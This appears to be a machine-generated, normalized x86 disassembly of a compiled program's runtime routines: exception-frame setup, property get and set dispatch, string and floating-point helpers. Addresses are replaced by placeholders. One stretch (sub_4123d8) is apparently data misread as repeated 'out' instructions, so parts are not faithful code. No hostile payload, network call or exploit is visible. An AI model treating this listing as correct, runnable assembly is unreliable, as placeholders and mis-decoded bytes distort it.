pop ecx
pop ebp
retn 0x4
sub_411e74
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_411f54
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_411eb0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403a8c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_40d7e4
xor eax eax
push ebp
push sub_411f0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f12
mov eax [ rw-data ]
call sub_40d8e4
retn
sub_411fac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403774
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_411fd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_40d988
xor eax eax
push ebp
push sub_412065
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bx 0x100
jb r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
call sub_4057d8
movzx edx bx
sub edx 0x100
cmp eax edx
jg r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41206c
mov eax [ rw-data ]
call sub_40da2c
retn
movzx eax bx
mov edx [ rw-data ]
mov eax [ edx + eax * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_412074
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41214a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40d988
xor eax eax
push ebp
push sub_41212d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4057e0
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412134
mov eax [ rw-data ]
call sub_40da2c
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403610
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404688
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_40873c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_412170
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4121ca
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4121d1
retn
call sub_411d34
mov eax rw-data
call sub_40dabc
mov eax rw-data
call sub_4052e0
mov eax rw-data
mov edx [ r-xdata ]
call sub_405ab4
mov eax rw-data
call sub_4053ac
sub_4121d4
push ebp
mov ebp esp
push ebx
mov ebx rw-data
xor eax eax
push ebp
push sub_4123ce
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4123d5
retn
mov eax rw-data
call sub_410fb0
mov eax sub_40e290
mov [ rw-data ] eax
mov eax sub_40e2a0
mov [ rw-data ] eax
mov edx sub_40e298
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e2b0
mov [ ebx ] eax
mov eax sub_40e6dc
mov [ ebx + 0x4 ] eax
mov eax j_sub_40e6e4
mov [ ebx + 0x8 ] eax
mov eax sub_40ec60
mov [ ebx + 0xc ] eax
mov eax sub_40ed7c
mov [ ebx + 0x10 ] eax
mov eax sub_40ede4
mov [ ebx + 0x14 ] eax
mov eax sub_40eec0
mov [ ebx + 0x18 ] eax
mov eax sub_40f00c
mov [ ebx + 0x1c ] eax
mov eax sub_40f048
mov [ ebx + 0x20 ] eax
mov eax sub_40f184
mov [ ebx + 0x24 ] eax
mov eax sub_40f36c
mov [ ebx + 0x28 ] eax
mov eax sub_40f2f8
mov [ ebx + 0x2c ] eax
mov eax sub_40f3bc
mov [ ebx + 0x30 ] eax
mov eax sub_40f49c
mov [ ebx + 0x34 ] eax
mov eax r-xdata
mov [ ebx + 0x38 ] eax
mov eax r-xdata
mov [ ebx + 0x3c ] eax
mov eax sub_40f5d4
mov [ ebx + 0x40 ] eax
mov eax sub_40f684
mov [ ebx + 0x44 ] eax
mov eax sub_40f6b0
mov [ ebx + 0x48 ] eax
mov eax sub_40f6d8
mov [ ebx + 0x4c ] eax
mov eax sub_40f6f0
mov [ ebx + 0x50 ] eax
mov eax sub_40f708
mov [ ebx + 0x54 ] eax
mov eax sub_40f74c
mov [ ebx + 0x58 ] eax
mov eax sub_40f720
mov [ ebx + 0x5c ] eax
mov eax sub_40f79c
mov [ ebx + 0x60 ] eax
mov eax sub_40f7d4
mov [ ebx + 0x64 ] eax
mov eax sub_40f800
mov [ ebx + 0x68 ] eax
mov eax sub_40f82c
mov [ ebx + 0x6c ] eax
mov eax sub_40f890
mov [ ebx + 0x70 ] eax
mov eax sub_40f840
mov [ ebx + 0x74 ] eax
mov eax sub_40f98c
mov [ ebx + 0x78 ] eax
mov eax sub_40f664
mov [ ebx + 0x7c ] eax
mov eax sub_40fb7c
mov [ ebx + 0x80 ] eax
mov eax sub_410a38
mov [ ebx + 0x84 ] eax
mov eax sub_410cb8
mov [ ebx + 0x88 ] eax
mov eax sub_410dc8
mov [ ebx + 0x8c ] eax
mov eax sub_40e328
mov [ ebx + 0x90 ] eax
mov eax sub_410eb4
mov [ ebx + 0x94 ] eax
mov eax sub_411138
mov [ ebx + 0x98 ] eax
mov eax sub_4112b8
mov [ ebx + 0x9c ] eax
mov eax sub_4113b0
mov [ ebx + 0xa0 ] eax
mov eax sub_410fc0
mov [ ebx + 0xa4 ] eax
mov eax sub_411038
mov [ ebx + 0xa8 ] eax
mov eax rw-data
call sub_4052cc
mov eax ebx
call sub_4052e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d6e4
mov [ rw-data ] eax
sub_4123d8
adc al 0xe7
dec eax
add [ ebp + 0x140000ff ] ah
out 0x48 eax
add [ esi + 0x140000ff ] ah
out 0x48 eax
add [ edi + 0x140000ff ] ah
out 0x48 eax
add [ eax + 0x140000ff ] ch
out 0x48 eax
add [ ecx + 0x140000ff ] ch
out 0x48 eax
add [ edx + 0x140000ff ] ch
out 0x48 eax
add [ ebx + 0x140000ff ] ch
out 0x48 eax
add [ edi + edi * 8 - 0x18ec0000 ] ch
dec eax
add [ ebp + 0x140000ff ] ch
out 0x48 eax
add [ esi + 0x140000ff ] ch
out 0x48 eax
add [ edi + 0x140000ff ] ch
out 0x48 eax
add [ eax + 0x140000ff ] dl
out 0x48 eax
add [ ecx + 0x140000ff ] dl
out 0x48 eax
add [ edx + 0x140000ff ] dl
out 0x48 eax
add [ ebx + 0x140000ff ] dl
out 0x48 eax
add [ edi + edi * 8 - 0x18ec0000 ] dl
dec eax
add [ ebp + 0x140000ff ] dl
out 0x48 eax
add [ esi + 0x140000ff ] dl
out 0x48 eax
add [ edi + 0x140000ff ] dl
out 0x48 eax
add [ eax + 0x140000ff ] bl
out 0x48 eax
add [ ecx + 0x140000ff ] bl
out 0x48 eax
add [ edx + 0x140000ff ] bl
out 0x48 eax
add [ ebx + 0x140000ff ] bl
out 0x48 eax
add [ edi + edi * 8 - 0x18ec0000 ] bl
dec eax
add [ ebp + 0x140000ff ] bl
out 0x48 eax
add [ esi + 0x140000ff ] bl
out 0x48 eax
add [ edi + 0x140000ff ] bl
out 0x48 eax
add [ eax + 0x140000ff ] al
out 0x48 eax
add [ ecx + 0x140000ff ] al
out 0x48 eax
add [ edx + 0x550000ff ] al
mov ebp esp
xor eax eax
push ebp
push sub_4124ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4124f4
retn
sub_412538
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412613
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_41252c
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_41252c
mov edx [ r-xdata ]
cmp esi edx
je r-xdata
mov edx edi
mov eax ebx
call sub_408a8c
jmp r-xdata
cmp edx esi
jne r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41261a
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_404480
mov eax edi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404480
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40865c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404480
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_40873c
test al al
je r-xdata
mov eax edi
mov edx esi
call sub_404688
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_41262c
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_412678
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_41252c
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408af0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41262c
mov edx [ rw-data ]
mov eax esi
call sub_40873c
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_40873c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408af0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4126dc
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_41274c
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_4127a0
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4127d0
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_412844
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4128a0
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_4128e4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_412960
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4046c0
mov ecx esp
mov edx esi
mov eax ebx
call sub_4128e4
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4129a8
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_412994
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4129e8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_412994
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_412a28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412a70
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_412b44
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4046ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a77
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
sub_412a80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412ac8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404c68
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_412c2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412acf
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
sub_412ad8
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_412938
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_4129a8
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_412a28
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_40442c
pop ebx
retn
sub_412b18
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_412960
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4129e8
pop ebx
retn
dec bl
je r-xdata
call sub_412a80
jmp r-xdata
pop ebx
retn
sub_412b44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412c1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_412ad8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404c68
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c23
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404b58
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404b1c
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_412c2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412cf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4046ac
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_412b18
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412cf9
lea eax [ ebp - 0xc ]
call sub_40442c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404b58
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_412d00
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_41252c
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_412d40 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_41252c
cmp [ eax ] 0x4
jne r-xdata
sub_412e18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_41252c
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_412e60 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_412f8f ]
jmp [ eax * 4 + jump_table_412efc ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_413024
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_413010
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_413064
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_413010
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4130a4
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_4130e4
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
